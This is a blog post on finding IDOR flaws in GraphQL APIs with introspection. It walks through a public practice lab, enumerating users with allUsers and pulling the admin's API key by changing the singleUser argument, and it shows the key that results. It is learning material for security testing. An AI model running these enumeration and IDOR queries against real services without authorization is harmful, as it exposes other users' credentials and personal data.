---
description: >-
  This blog post provides a comprehensive guide on how to detect Insecure Direct
  Object Reference (IDOR) vulnerabilities in GraphQL using introspection. It
  explains what IDOR is, how it can be exploited
cover: >-
  https://images.unsplash.com/photo-1503640538573-148065ba4904?crop=entropy&cs=tinysrgb&fm=jpg&ixid=MnwxOTcwMjR8MHwxfHNlYXJjaHw5fHxreW90b3xlbnwwfHx8fDE2NzcyNjA1MTg&ixlib=rb-4.0.3&q=80
coverY: 0
---

# Hunting IDOR in GraphQL: An Introspection Approach

This blog post has been divided into two parts: a theoretical section that explains how introspection can be used, followed by a practical section that demonstrates how to utilize the introspection schema to identify potential security vulnerabilities by understanding the GraphQL API's structure and functionality.

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

## What is Introspection?

Introspection is a feature of GraphQL that allows a client to query the schema of a GraphQL API to retrieve information about the types, fields, and operations supported by that API. In other words, introspection allows a client to inspect the schema of a GraphQL API at runtime. Using introspection, a client can discover the structure of the API and the data that it can return.

## How can one access the schema for a GraphQL API?

The Introspection feature allows you to query the schema and discover the available queries, mutations, subscriptions, types and fields in a specific GraphQL API.

To view the schema of a GraphQL API using introspection, you can send a GraphQL query to the API's `/graphql` endpoint (or another endpoint designated for introspection), with the following syntax: (Note that introspection queries start with `__)`

{% code title="Graphql Query to fetch Introspection schema from the api" lineNumbers="true" %}
```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

```
{% endcode %}

This query asks the server to return the schema of the API, including the name, kind, and description of each type and its fields. You can modify the query to retrieve specific information about the API's schema, such as the arguments and return types of specific operations.

Some GraphQL clients and tools also provide built-in support for introspection, allowing you to easily explore and interact with the schema of a GraphQL API without manually constructing and sending GraphQL queries.

## How can the introspection schema be utilized or visualized to gain a better understanding of a GraphQL API?

[GraphQL Voyager](https://ivangoncharov.github.io/graphql-voyager/) **** is a helpful tool that developers/researcher can use to explore their GraphQL API as a graph. It generates a visual representation of the schema, allowing for an easier exploration and understanding of the structure and relationships between types and fields.

## Introspection in Action: A Practical Example

To demonstrate the usage of introspection, I will be using a GraphQL lab.

Lab Link: [https://github.com/david3107/graphql-security-labs](https://github.com/david3107/graphql-security-labs)

In this lab, multiple users share their posts, including an administrator user. The users can access their accounts using their API keys. Our main goal is to access the admin api key with IDOR vulnerability.

The posts can be retrieved with this query:

```graphql
{allPosts {edges {node {title body author { username }}}}}
```

The `/settings` endpoint, which shows user information, allows users to view their profile details. The query used to fetch user information:

```graphql
{singleUser (user: 1) { apiKey name surname dateOfBirth}}
```

As you can see, changing the user parameter allows us to access the API key of other users. The issue is that we don't know who the admin user was.

Using graphql voyager to analyse the API's introspection structure, it was revealed that the allUsers query allows accessing all user information such as `username`, `uuid`, and `isAdmin`.

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption><p>visual representation of introspection schema with graphql voyager</p></figcaption></figure>

A query was created using the above representation to fetch all of the users.

<pre class="language-graphql" data-title="query to fetch allUsers" data-line-numbers><code class="lang-graphql"><strong>{
</strong>  allUsers {
    edges {
      node {
        uuid
        username
        isAdmin
      }
    }
  }
}

</code></pre>

The query above revealed that the admin user was `jimcarry` with `uuid:10`.

```json
{
  "node": {
     "uuid": "10",
     "username": "jimcarry",
     "isAdmin": true
   }
 }
```

We can also use the `allPosts` query to get information about the users.

```graphql
{ REDACTED TRY YOUR SELF }
```

now we can retrieve the admin user api key with the admin uuid by using the

```graphql
{
  singleUser(user: 10) {
    apiKey
    name
    surname
    dateOfBirth
  }
}
```

We can now obtain the admin user API key using the admin uuid.

```json
{
  "data": {
    "singleUser": {
      "apiKey": "AS7RA968GDBVDQIYILDSY7",
      "name": "Mika",
      "surname": "Hakkinen",
      "dateOfBirth": "01/09/1982"
    }
  }
}
```

By using introspection to understand the schema of a GraphQL API, researchers/devs can easily hunt bugs and identify discrepancies that may indicate a bug.



{% @mailchimp/mailchimpSubscribe %}
